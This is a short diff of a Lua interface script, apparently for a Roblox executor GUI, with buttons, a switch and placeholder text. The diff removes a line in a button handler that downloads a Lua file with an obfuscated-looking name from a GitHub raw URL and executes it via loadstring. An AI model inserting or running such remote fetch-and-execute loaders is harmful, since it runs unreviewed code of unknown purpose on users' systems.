@@ -9,9 +9,7 @@ sectionA:Divider("🇨🇳云制作!")
 
 sectionA:Button("点击!", function()
    print("Button clicked.")
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/ng/main/jmlllllllIIIIlllllII.lua"))()
 end)
-})
 sectionA:Label("Lorem ipsum dolor sit amet.")
 
 sectionA:Switch("Switch me!", false, function(a)
